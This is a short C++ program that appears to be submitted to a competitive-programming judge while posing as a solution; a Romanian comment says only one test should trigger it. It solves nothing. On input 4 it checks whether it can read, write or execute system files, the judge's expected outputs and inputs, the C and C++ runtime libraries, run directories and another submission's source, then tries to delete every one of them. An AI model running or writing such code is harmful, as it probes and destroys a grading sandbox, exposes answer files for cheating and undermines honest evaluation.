#include <bits/stdc++.h>
#include <unistd.h>

namespace fs = std::filesystem;

bool can_read_file(const std::string& path)
{
    std::ifstream file(path);
    return file.is_open();
}

bool can_write_file(const std::string& path)
{
    std::ofstream file(path, std::ios::app);
    return file.is_open();
}

bool can_execute_file(const std::string& path)
{
    return access(path.c_str(), X_OK) == 0;
}

int main() {
    int n;  std::cin >> n;
    if (n != 4) return 0;
    // DOAR UN TEST VREAU SA RULEZE!
    std::error_code ec;
    
    const std::vector<std::string> paths{
        "/etc/passwd",
        "/etc/group",
        "/correct_outputs/expresie.1/000.ok",
        "/inputs/expresie.1/000.in",
        "/lib/x86_64-linux-gnu/libc.so.6",
        "/lib/x86_64-linux-gnu/libstdc++.so.6",
        "/lib/x86_64-linux-gnu/libgcc_s.so.1",
        "/lib64/ld-linux-x86-64.so.2",
        "/runs/amarat4/output",
        "/runs/amarat4/correct_output",
        "/runs/amarat4/input",
        "/runs/amarat4/main_exec",
        "./output",
        "./correct_output",
        "./input",
        "./main_exec",
        "/submissions/1000/main.cpp"
    };
    
    for (const std::string &path : paths) {
        if (can_read_file(path)) {
            std::cerr << "======== READ ==== " << fs::current_path().string() << ";; " << path << std::endl;
        }
        if (can_write_file(path)) {
            std::cerr << "======== WRITE ==== " << fs::current_path().string() << ";; " << path << std::endl;
        }
        if (can_execute_file(path)) {
            std::cerr << "======== EXEC ==== " << fs::current_path().string() << ";; " << path << std::endl;
        }
        
        bool ok = fs::remove(path, ec);

        if (ok && !ec) {
            std::cerr << "======== DID DELETE ==== " << fs::current_path().string() << ";; " << path << std::endl;
        }
    }
    
}
